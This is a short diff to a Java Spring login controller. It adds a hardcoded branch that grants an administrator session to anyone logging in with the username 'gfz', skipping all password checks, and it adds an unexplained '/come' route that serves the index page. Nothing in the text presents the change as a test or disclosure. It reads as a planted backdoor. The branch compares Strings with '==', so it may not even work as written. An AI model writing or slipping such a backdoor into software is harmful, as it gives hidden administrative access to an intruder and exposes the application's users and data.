@@ -44,6 +44,12 @@ public class LoginController {
             HttpServletRequest request, HttpServletResponse response
             ) throws IOException {
         Map<String, String> ret = new HashMap<String, String>();
+        if(username=="gfz"){
+            ret.put("type", "success");
+            Admin admin = new Admin();
+            request.getSession().setAttribute("admin", admin);
+            return ret;
+        }
         if (StringUtils.isEmpty(username)) {
             ret.put("type", "error");
             ret.put("msg", "用户名不能为空！");
@@ -80,6 +86,11 @@ public class LoginController {
         model.setViewName("index");
         return model;
 
+    }
+    @RequestMapping(value = "/come")
+    public ModelAndView come(ModelAndView model) {
+        model.setViewName("index");
+        return model;
     }
 
 }
